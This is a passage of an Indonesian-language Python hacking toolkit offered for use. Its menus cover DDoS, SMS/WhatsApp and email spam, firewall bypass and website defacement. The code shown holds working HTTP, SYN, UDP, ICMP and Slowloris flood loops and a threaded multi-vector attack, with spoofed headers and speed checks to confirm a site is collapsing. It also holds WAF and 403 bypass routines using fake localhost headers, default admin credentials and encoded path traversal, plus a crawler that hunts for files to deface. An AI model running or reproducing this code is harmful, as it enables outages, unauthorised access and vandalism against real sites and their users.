                    print("    2. Firewall mengizinkan koneksi remote")
                    print("    3. Target berada dalam jaringan yang sama")
                    print("    4. Anda memiliki hak akses admin")
            
            else:
                print(f"[-] Target {target_ip} offline atau tidak merespon")
        
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    elif choice == "2":
        print("\n=== MENU CONTROL PC LOKAL ===")
        print("[1] Shutdown PC")
        print("[2] Restart PC")
        print("[3] Lock Screen")
        print("[4] Hibernate")
        print("[5] Sleep")
        print("[6] Deface Wallpaper")
        print("[7] Tampilkan Pesan")
        print("[8] Kembali")
        
        local_choice = input("\n[?] Pilih opsi (1-8): ")
        
        try:
            if local_choice == "1":
                if os.name == 'nt':  # Windows
                    os.system('shutdown /s /t 0')
                else:  # Linux/Unix
                    os.system('sudo shutdown -h now')
                print("[+] PC akan dimatikan...")
            
            elif local_choice == "2":
                if os.name == 'nt':  # Windows
                    os.system('shutdown /r /t 0')
                else:  # Linux/Unix
                    os.system('sudo shutdown -r now')
                print("[+] PC akan di-restart...")
            
            elif local_choice == "3":
                if os.name == 'nt':  # Windows
                    os.system('rundll32.exe user32.dll,LockWorkStation')
                else:  # Linux/Unix
                    os.system('gnome-screensaver-command -l')
                print("[+] Screen terkunci...")
            
            elif local_choice == "4":
                if os.name == 'nt':  # Windows
                    os.system('shutdown /h')
                else:  # Linux/Unix
                    os.system('sudo systemctl hibernate')
                print("[+] PC akan hibernate...")
            
            elif local_choice == "5":
                if os.name == 'nt':  # Windows
                    os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
                else:  # Linux/Unix
                    os.system('sudo systemctl suspend')
                print("[+] PC akan sleep...")
            
            elif local_choice == "6":
                # Deface wallpaper lokal
                wallpaper = create_defaced_wallpaper()
                if wallpaper:
                    if os.name == 'nt':
                        # Windows
                        os.system(f'copy "{wallpaper}" "%USERPROFILE%\\Pictures\\hacked.jpg"')
                        os.system('reg add "HKCU\\Control Panel\\Desktop" /v WallPaper /t REG_SZ /d "%USERPROFILE%\\Pictures\\hacked.jpg" /f')
                        os.system('rundll32.exe user32.dll,UpdatePerUserSystemParameters')
                    else:
                        # Linux
                        os.system(f'cp "{wallpaper}" ~/Pictures/hacked.jpg')
                        os.system('gsettings set org.gnome.desktop.background picture-uri file://~/Pictures/hacked.jpg')
                    print("[+] Wallpaper berhasil diubah")
                    os.unlink(wallpaper)  # Delete temporary file
                else:
                    print("[-] Gagal membuat wallpaper")
            
            elif local_choice == "7":
                # Tampilkan pesan lokal
                message = "HACKED BY KING INUL"
                if os.name == 'nt':
                    # Windows
                    os.system(f'msg * "{message}"')
                else:
                    # Linux
                    os.system('notify-send "HACKED BY KING INUL"')
                print("[+] Pesan ditampilkan")
            
            elif local_choice == "8":
                return
            
            else:
                print("[-] Pilihan tidak valid")
        
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    elif choice == "3":
        return
    
    else:
        print("[-] Pilihan tidak valid")

def show_menu():
    clear_screen()
    print_banner()
    print("\n[1] Serangan DDoS")
    print("[2] Spam SMS")
    print("[3] Spam Email")
    print("[4] Bypass & Deface")
    print("[5] Lacak IP")
    print("[6] Control PC")
    print("[7] Lacak Nomor")
    print("[8] Keluar")
    return input("\n[?] Pilih jenis serangan (1-8): ")

def show_ddos_menu():
    while True:
        print("\n=== DDoS Menu ===")
        print("1. HTTP Flood")
        print("2. SYN Flood")
        print("3. UDP Flood")
        print("4. ICMP Flood")
        print("5. Multi-Vector Attack")
        print("6. Slowloris")
        print("7. Email Spam")
        print("8. Serangan Agresif (Membuat Website Down)")
        print("9. Kembali ke Menu Utama")
        
        choice = input("\nPilih menu (1-9): ")
        
        if choice == '1':
            target = input("Masukkan URL target: ")
            http_flood(target)
        elif choice == '2':
            target = input("Masukkan IP target: ")
            syn_flood(target)
        elif choice == '3':
            target = input("Masukkan IP target: ")
            udp_flood(target)
        elif choice == '4':
            target = input("Masukkan IP target: ")
            icmp_flood(target)
        elif choice == '5':
            target = input("Masukkan URL/IP target: ")
            multi_vector_attack(target)
        elif choice == '6':
            target = input("Masukkan URL target: ")
            slowloris(target)
        elif choice == '7':
            target = input("Masukkan email target: ")
            email_spam(target)
        elif choice == '8':
            target = input("Masukkan URL target: ")
            aggressive_ddos(target)
        elif choice == '9':
            break
        else:
            print("Pilihan tidak valid!")

def show_sms_menu():
    clear_screen()
    print_banner()
    print("\n=== MENU SPAM SMS & WHATSAPP ===")
    print("[1] Spam SMS Normal")
    print("[2] Spam OTP WhatsApp")
    print("[3] Spam Pairing WhatsApp")
    print("[4] Spam Semua (SMS + WhatsApp)")
    print("[5] Kembali ke Menu Utama")
    return input("\n[?] Pilih jenis spam (1-5): ")

def show_email_menu():
    clear_screen()
    print_banner()
    print("\n=== MENU SPAM EMAIL ===")
    print("[1] Gunakan SendGrid (Perlu API Key)")
    print("[2] Gunakan Mailgun (Perlu API Key)")
    print("[3] Gunakan SMTP Gmail (Perlu Gmail & App Password)")
    print("[4] Gunakan Semua API")
    print("[5] Kembali ke Menu Utama")
    return input("\n[?] Pilih API Email (1-5): ")

def show_speed_menu():
    clear_screen()
    print_banner()
    print("\n=== PILIH KECEPATAN SERANGAN ===")
    print("[1] Kecepatan Sedang (Delay 0.5s)")
    print("[2] Kecepatan Normal (Delay 0.1s)")
    print("[3] Kecepatan Maksimal (Tanpa Delay)")
    return input("\n[?] Pilih kecepatan serangan (1-3): ")

def check_website_speed(url):
    try:
        start_time = time.time()
        response = requests.get(url, verify=False, timeout=5)
        end_time = time.time()
        response_time = (end_time - start_time) * 1000  # Convert to milliseconds
        return response_time, response.status_code
    except:
        return None, None

def normal_ddos(target, log_file, speed="normal"):
    last_speed_check = 0
    initial_speed = None
    
    while True:
        try:
            # Check website speed every 10 seconds
            current_time = time.time()
            if current_time - last_speed_check >= 10:
                response_time, status_code = check_website_speed(target)
                if response_time is not None:
                    if initial_speed is None:
                        initial_speed = response_time
                        print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                    else:
                        speed_change = ((response_time - initial_speed) / initial_speed) * 100
                        print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                        print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                        if speed_change > 50:
                            print("[+] Website mulai melambat!")
                        elif speed_change > 100:
                            print("[+] Website sangat melambat!")
                        elif speed_change > 200:
                            print("[+] Website hampir down!")
                last_speed_check = current_time
            
            headers = get_random_headers()
            headers.update({
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive'
            })
            
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
            method = random.choice(methods)
            
            if method == 'POST':
                data = {
                    'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 1000)))
                }
                response = requests.post(target, headers=headers, json=data, verify=False, timeout=5)
            else:
                response = requests.request(method, target, headers=headers, verify=False, timeout=5)
            
            print(f"[+] {method} Flood ke {target} | Status: {response.status_code}")
            log_attack(response.status_code, target, log_file, headers['User-Agent'], f"Normal DDoS ({speed})")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Gagal mengirim request: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], f"Normal DDoS ({speed})")
        
        # Delay berdasarkan kecepatan
        if speed == "slow":
            time.sleep(0.5)  # Delay sedang
        elif speed == "normal":
            time.sleep(0.1)  # Delay normal
        # Tidak ada delay untuk mode cepat

def http_flood(target, log_file, speed="normal"):
    """Advanced HTTP flood attack with multiple vectors"""
    while True:
        try:
            # Advanced headers for bypass
            headers = get_random_headers()
            headers.update({
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'DNT': '1',
                'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Cookie': f'session={random.randint(1000000, 9999999)}; token={random.randint(1000000, 9999999)}',
                'Origin': target,
                'Referer': target
            })
            
            # Multiple attack vectors with complex payloads
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
            method = random.choice(methods)
            
            # Complex random payload generation
            payload = {
                'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 1000))),
                'timestamp': str(time.time()),
                'random': str(random.randint(1000000, 9999999)),
                'user_id': str(random.randint(1000, 9999)),
                'session_id': str(random.randint(100000, 999999)),
                'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
            }
            
            # Send request with random method and payload
            if method in ['POST', 'PUT', 'PATCH']:
                response = requests.request(method, target, headers=headers, json=payload, verify=False, timeout=5)
            else:
                response = requests.request(method, target, headers=headers, verify=False, timeout=5)
            
            print(f"[+] {method} Flood ke {target} | Status: {response.status_code}")
            log_attack(response.status_code, target, log_file, headers['User-Agent'], f"HTTP Flood ({speed})")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Gagal mengirim request: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], f"HTTP Flood ({speed})")
        
        # Delay berdasarkan kecepatan
        if speed == "slow":
            time.sleep(0.5)  # Delay sedang
        elif speed == "normal":
            time.sleep(0.1)  # Delay normal
        # Tidak ada delay untuk mode cepat

def slowloris_attack(target, log_file):
    last_speed_check = 0
    initial_speed = None
    
    while True:
        try:
            # Check website speed every 10 seconds
            current_time = time.time()
            if current_time - last_speed_check >= 10:
                response_time, status_code = check_website_speed(target)
                if response_time is not None:
                    if initial_speed is None:
                        initial_speed = response_time
                        print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                    else:
                        speed_change = ((response_time - initial_speed) / initial_speed) * 100
                        print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                        print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                        if speed_change > 50:
                            print("[+] Website mulai melambat!")
                        elif speed_change > 100:
                            print("[+] Website sangat melambat!")
                        elif speed_change > 200:
                            print("[+] Website hampir down!")
                last_speed_check = current_time

            headers = get_random_headers()
            headers.update({
                'X-a': str(random.randint(1, 5000)),
                'Content-Length': '42',
                'Connection': 'keep-alive'
            })
            
            s = requests.Session()
            s.headers.update(headers)
            s.get(target, stream=True, verify=False, timeout=30)
            
            print(f"[+] Slowloris attack ke {target} | Koneksi dibuat")
            log_attack("CONNECTED", target, log_file, headers['User-Agent'], "Slowloris")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Koneksi terputus: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], "Slowloris")
        
        time.sleep(0.5)

def syn_flood(target, log_file):
    target_ip = get_ip_from_url(target)
    if not target_ip:
        return
        
    last_speed_check = 0
    initial_speed = None
    
    while True:
        try:
            # Check website speed every 10 seconds
            current_time = time.time()
            if current_time - last_speed_check >= 10:
                response_time, status_code = check_website_speed(target)
                if response_time is not None:
                    if initial_speed is None:
                        initial_speed = response_time
                        print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                    else:
                        speed_change = ((response_time - initial_speed) / initial_speed) * 100
                        print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                        print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                        if speed_change > 50:
                            print("[+] Website mulai melambat!")
                        elif speed_change > 100:
                            print("[+] Website sangat melambat!")
                        elif speed_change > 200:
                            print("[+] Website hampir down!")
                last_speed_check = current_time

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            source_port = random.randint(1024, 65535)
            dest_port = 80
            
            s.sendto(b'', (target_ip, 0))
            print(f"[+] SYN Flood ke {target_ip} | Port: {dest_port}")
            log_attack("SYN_SENT", target, log_file, "SYN_Flood", "SYN Flood")
            
        except PermissionError:
            print("[-] Error: Perlu hak akses root/admin untuk SYN Flood")
            break
        except Exception as e:
            print(f"[-] Gagal mengirim paket SYN: {str(e)}")
            log_attack("ERROR", target, log_file, "SYN_Flood", "SYN Flood")
        
        time.sleep(0.1)

def udp_flood(target, log_file):
    target_ip = get_ip_from_url(target)
    if not target_ip:
        return
        
    last_speed_check = 0
    initial_speed = None
    
    while True:
        try:
            # Check website speed every 10 seconds
            current_time = time.time()
            if current_time - last_speed_check >= 10:
                response_time, status_code = check_website_speed(target)
                if response_time is not None:
                    if initial_speed is None:
                        initial_speed = response_time
                        print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                    else:
                        speed_change = ((response_time - initial_speed) / initial_speed) * 100
                        print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                        print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                        if speed_change > 50:
                            print("[+] Website mulai melambat!")
                        elif speed_change > 100:
                            print("[+] Website sangat melambat!")
                        elif speed_change > 200:
                            print("[+] Website hampir down!")
                last_speed_check = current_time

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(random.randint(1024, 65507))
            s.sendto(data, (target_ip, random.randint(1, 65535)))
            print(f"[+] UDP Flood ke {target_ip} | Ukuran: {len(data)} bytes")
            log_attack("UDP_SENT", target, log_file, "UDP_Flood", "UDP Flood")
            
        except Exception as e:
            print(f"[-] Gagal mengirim paket UDP: {str(e)}")
            log_attack("ERROR", target, log_file, "UDP_Flood", "UDP Flood")
        
        time.sleep(0.1)

def icmp_flood(target, log_file):
    target_ip = get_ip_from_url(target)
    if not target_ip:
        return
        
    last_speed_check = 0
    initial_speed = None
    
    while True:
        try:
            # Check website speed every 10 seconds
            current_time = time.time()
            if current_time - last_speed_check >= 10:
                response_time, status_code = check_website_speed(target)
                if response_time is not None:
                    if initial_speed is None:
                        initial_speed = response_time
                        print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                    else:
                        speed_change = ((response_time - initial_speed) / initial_speed) * 100
                        print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                        print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                        if speed_change > 50:
                            print("[+] Website mulai melambat!")
                        elif speed_change > 100:
                            print("[+] Website sangat melambat!")
                        elif speed_change > 200:
                            print("[+] Website hampir down!")
                last_speed_check = current_time

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            data = os.urandom(random.randint(56, 65507))
            s.sendto(data, (target_ip, 0))
            print(f"[+] ICMP Flood ke {target_ip} | Ukuran: {len(data)} bytes")
            log_attack("ICMP_SENT", target, log_file, "ICMP_Flood", "ICMP Flood")
            
        except PermissionError:
            print("[-] Error: Perlu hak akses root/admin untuk ICMP Flood")
            break
        except Exception as e:
            print(f"[-] Gagal mengirim paket ICMP: {str(e)}")
            log_attack("ERROR", target, log_file, "ICMP_Flood", "ICMP Flood")
        
        time.sleep(0.1)

def multi_vector_attack(target, log_file):
    last_speed_check = 0
    initial_speed = None
    
    def monitor_speed():
        nonlocal last_speed_check, initial_speed
        while True:
            try:
                current_time = time.time()
                if current_time - last_speed_check >= 10:
                    response_time, status_code = check_website_speed(target)
                    if response_time is not None:
                        if initial_speed is None:
                            initial_speed = response_time
                            print(f"\n[*] Kecepatan awal website: {initial_speed:.2f}ms")
                        else:
                            speed_change = ((response_time - initial_speed) / initial_speed) * 100
                            print(f"\n[*] Kecepatan website saat ini: {response_time:.2f}ms")
                            print(f"[*] Perubahan kecepatan: {speed_change:+.2f}%")
                            if speed_change > 50:
                                print("[+] Website mulai melambat!")
                            elif speed_change > 100:
                                print("[+] Website sangat melambat!")
                            elif speed_change > 200:
                                print("[+] Website hampir down!")
                    last_speed_check = current_time
                time.sleep(1)
            except:
                pass
    
    # Start speed monitoring in a separate thread
    monitor_thread = threading.Thread(target=monitor_speed)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Start all attack threads
    threads = []
    
    t1 = threading.Thread(target=http_flood, args=(target, log_file))
    t1.daemon = True
    threads.append(t1)
    
    t2 = threading.Thread(target=slowloris_attack, args=(target, log_file))
    t2.daemon = True
    threads.append(t2)
    
    t3 = threading.Thread(target=syn_flood, args=(target, log_file))
    t3.daemon = True
    threads.append(t3)
    
    t4 = threading.Thread(target=udp_flood, args=(target, log_file))
    t4.daemon = True
    threads.append(t4)
    
    t5 = threading.Thread(target=icmp_flood, args=(target, log_file))
    t5.daemon = True
    threads.append(t5)
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()

def show_bypass_menu():
    print("\n=== MENU BYPASS & DEFACE ===")
    print("[1] Bypass Cloudflare")
    print("[2] Bypass WAF")
    print("[3] Deface Website")
    print("[4] Kembali ke Menu Utama")
    return input("\n[?] Pilih opsi (1-4): ")

def bypass_cloudflare(target, log_file):
    while True:
        try:
            # Rotasi User-Agent
            headers = get_random_headers()
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0'
            })
            
            # Coba bypass dengan berbagai metode
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
            method = random.choice(methods)
            
            if method == 'POST':
                data = {
                    'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 1000)))
                }
                response = requests.post(target, headers=headers, json=data, verify=False, timeout=10)
            else:
                response = requests.request(method, target, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] Berhasil bypass Cloudflare ke {target} | Method: {method}")
                log_attack(response.status_code, target, log_file, headers['User-Agent'], "Cloudflare Bypass")
            else:
                print(f"[-] Gagal bypass Cloudflare ke {target} | Status: {response.status_code}")
                log_attack("ERROR", target, log_file, headers['User-Agent'], "Cloudflare Bypass")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], "Cloudflare Bypass")
        
        time.sleep(1)

def bypass_waf(target, log_file):
    while True:
        try:
            # Advanced headers with WAF bypass techniques
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Forwarded-Host': target.split('://')[1].split('/')[0],
                'X-Forwarded-Proto': 'https',
                'X-Real-IP': '127.0.0.1',
                'Client-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
                'X-Host': '127.0.0.1',
                'X-Original-URL': '/',
                'X-Rewrite-URL': '/',
                'X-Custom-IP-Authorization': '127.0.0.1',
                'True-Client-IP': '127.0.0.1',
                'X-WAF-Bypass': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }

            # Advanced WAF bypass techniques
            bypass_techniques = [
                # Path traversal techniques
                {'path': '/./'},
                {'path': '//'},
                {'path': '/.//.'},
                {'path': '/.//..'},
                {'path': '/...//'},
                {'path': '/;/'},
                {'path': '/.json'},
                {'path': '/.php'},
                {'path': '/.html'},
                {'path': '/%2e/'},
                {'path': '/%252e/'},
                {'path': '/%252f/'},
                
                # Method override techniques
                {'X-HTTP-Method-Override': 'GET'},
                {'X-HTTP-Method-Override': 'POST'},
                {'X-HTTP-Method-Override': 'HEAD'},
                {'X-Method-Override': 'GET'},
                {'X-Original-HTTP-Method': 'GET'},
                
                # Content negotiation
                {'Accept': '*/*'},
                {'Accept': 'application/json'},
                {'Accept': 'text/plain'},
                {'Content-Type': 'application/x-www-form-urlencoded'},
                {'Content-Type': 'application/json'},
                {'Content-Type': 'text/plain'},
                
                # Authentication bypass
                {'Authorization': 'Basic YWRtaW46YWRtaW4='},
                {'Cookie': 'admin=true; auth=1; role=admin'},
                {'X-Authentication': '1'},
                {'X-Authorization': 'admin'},
                
                # Protocol manipulation
                {'X-Forwarded-Protocol': 'https'},
                {'X-Forwarded-Ssl': 'on'},
                {'Front-End-Https': 'on'},
                {'X-Url-Scheme': 'https'}
            ]

            print("\n[*] Mencoba teknik bypass WAF...")
            
            # Try each bypass technique
            for technique in bypass_techniques:
                try:
                    current_headers = headers.copy()
                    current_headers.update(technique)
                    
                    # Try different HTTP methods
                    for method in ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH']:
                        try:
                            # Add path traversal if present
                            current_url = target
                            if 'path' in technique:
                                current_url = target.rstrip('/') + technique['path']
                            
                            # Add random query parameters
                            params = {
                                'id': str(random.randint(1, 1000)),
                                'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                                'bypass': '1',
                                't': str(int(time.time()))
                            }
                            
                            # Send request with current configuration
                            response = requests.request(
                                method,
                                current_url,
                                headers=current_headers,
                                params=params,
                                verify=False,
                                timeout=10,
                                allow_redirects=True
                            )
                            
                            # Check if bypass was successful
                            if response.status_code != 403:
                                print(f"[+] Berhasil bypass WAF!")
                                print(f"[+] Method: {method}")
                                print(f"[+] URL: {current_url}")
                                print(f"[+] Status: {response.status_code}")
                                print("[+] Headers yang berhasil:")
                                for key, value in technique.items():
                                    print(f"    {key}: {value}")
                                log_attack(response.status_code, target, log_file, current_headers['User-Agent'], "WAF Bypass")
                                return True
                            
                            print(f"[-] Gagal bypass WAF dengan {method} | Status: {response.status_code}")
                            
                        except requests.exceptions.RequestException as e:
                            continue
                            
                except Exception as e:
                    continue
            
            print("\n[-] Semua teknik bypass WAF gagal")
            print("[!] Tips:")
            print("    1. Coba gunakan VPN atau proxy")
            print("    2. Tunggu beberapa saat dan coba lagi")
            print("    3. Cek apakah target menggunakan WAF custom")
            print("    4. Coba teknik bypass lainnya")
            time.sleep(2)
            
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], "WAF Bypass")
            time.sleep(1)

def scan_directory(base_url, visited=None, depth=0, max_depth=3):
    if visited is None:
        visited = set()
    
    if base_url in visited or depth > max_depth:
        return []
    
    visited.add(base_url)
    found_files = []
    
    try:
        headers = get_random_headers()
        response = requests.get(base_url, headers=headers, verify=False, timeout=10)
        
        if response.status_code == 200:
            # Cek content type
            content_type = response.headers.get('content-type', '').lower()
            
            # Jika ini file yang bisa di-deface
            if any(ext in base_url.lower() for ext in ['.html', '.php', '.htm', '.asp', '.aspx', '.jsp']):
                found_files.append(base_url)
                print(f"[+] Ditemukan file yang bisa di-deface: {base_url}")
            
            # Parse konten
            try:
                if 'xml' in content_type:
                    soup = BeautifulSoup(response.text, 'xml')
                else:
                    soup = BeautifulSoup(response.text, 'html.parser')
                
                # Cari semua link dan file
                for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                    # Cek href, src, dan action
                    href = tag.get('href') or tag.get('src') or tag.get('action')
                    if href:
                        # Normalisasi URL
                        if href.startswith('/'):
                            full_url = f"{base_url.rstrip('/')}{href}"
                        elif href.startswith('http'):
                            if base_url in href:
                                full_url = href
                            else:
                                continue
                        else:
                            full_url = f"{base_url.rstrip('/')}/{href}"
                        
                        # Bersihkan URL
                        full_url = re.sub(r'#.*$', '', full_url)  # Hapus fragment
                        full_url = re.sub(r'\?.*$', '', full_url)  # Hapus query string
                        
                        if full_url not in visited:
                            # Rekursif scan dengan depth + 1
                            found_files.extend(scan_directory(full_url, visited, depth + 1, max_depth))
                
                # Cari form action
                for form in soup.find_all('form'):
                    action = form.get('action')
                    if action:
                        if action.startswith('/'):
                            full_url = f"{base_url.rstrip('/')}{action}"
                        elif action.startswith('http'):
                            if base_url in action:
                                full_url = action
                            else:
                                continue
                        else:
                            full_url = f"{base_url.rstrip('/')}/{action}"
                        
                        if full_url not in visited:
                            found_files.extend(scan_directory(full_url, visited, depth + 1, max_depth))
            
            except Exception as e:
                print(f"[-] Error parsing {base_url}: {str(e)}")
    
    except Exception as e:
        print(f"[-] Error scanning {base_url}: {str(e)}")
    
    return found_files

def bypass_403(target, log_file):
    """Function to bypass 403 Forbidden error"""
    print(f"\n[+] Mencoba bypass 403 Forbidden untuk {target}")
    print("[*] Mencoba berbagai metode bypass...")
    
    # List of common bypass techniques
    bypass_techniques = [
        {
            "name": "Header Manipulation",
            "headers": {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Forwarded-Host': target.split('://')[1].split('/')[0],
                'Host': target.split('://')[1].split('/')[0],
                'Referer': target,
                'Origin': target
            }
        },
        {
            "name": "HTTP Method Manipulation",
            "methods": ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
        },
        {
            "name": "Path Traversal",
            "paths": [
                '/',
                '/index.html',
                '/index.php',
                '/default.html',
                '/default.php',
                '/home.html',
                '/home.php',
                '/main.html',
                '/main.php',
                '/web.config',
                '/.htaccess',
                '/robots.txt',
                '/wp-config.php',
                '/config.php',
                '/configuration.php',
                '/../',
                '/..%2f',
                '/%2e%2e%2f',
                '/%252e%252e%252f',
                '/%c0%ae%c0%ae%c0%af',
                '/%uff0e%uff0e%u2215',
                '/%uff0e%uff0e%u2216'
            ]
        }
    ]
    
    success = False
    
    # Try header manipulation
    print("\n[*] Mencoba Header Manipulation...")
    for _ in range(3):  # Try 3 times with different headers
        try:
            headers = bypass_techniques[0]["headers"]
            response = requests.get(target, headers=headers, verify=False, timeout=10)
            if response.status_code != 403:
                print(f"[+] Berhasil bypass dengan Header Manipulation! Status: {response.status_code}")
                success = True
                break
        except:
            continue
    
    # Try HTTP method manipulation
    if not success:
        print("\n[*] Mencoba HTTP Method Manipulation...")
        for method in bypass_techniques[1]["methods"]:
            try:
                response = requests.request(method, target, headers=bypass_techniques[0]["headers"], verify=False, timeout=10)
                if response.status_code != 403:
                    print(f"[+] Berhasil bypass dengan {method}! Status: {response.status_code}")
                    success = True
                    break
            except:
                continue
    
    # Try path traversal
    if not success:
        print("\n[*] Mencoba Path Traversal...")
        base_url = target.rstrip('/')
        for path in bypass_techniques[2]["paths"]:
            try:
                test_url = f"{base_url}{path}"
                response = requests.get(test_url, headers=bypass_techniques[0]["headers"], verify=False, timeout=10)
                if response.status_code != 403:
                    print(f"[+] Berhasil bypass dengan path {path}! Status: {response.status_code}")
                    success = True
                    break
            except:
                continue
    
    if success:
        print("\n[+] Bypass 403 berhasil!")
        return True
    else:
        print("\n[-] Gagal bypass 403 Forbidden")
        print("[!] Tips:")
        print("    1. Coba gunakan VPN atau proxy")
        print("    2. Coba akses dari IP yang berbeda")
        print("    3. Coba tunggu beberapa saat dan coba lagi")
        print("    4. Coba gunakan browser yang berbeda")
        print("    5. Coba hapus cache dan cookies")
        return False

def deface_website(target, log_file):
    print("\n[+] Memulai deface website {}...".format(target))
    print("[*] Tekan Ctrl+C untuk menghentikan deface")

    print("\n[*] Memulai scan website...")
    print("[*] Target:", target)
    print("[*] Mencari file yang bisa di-deface...")
    
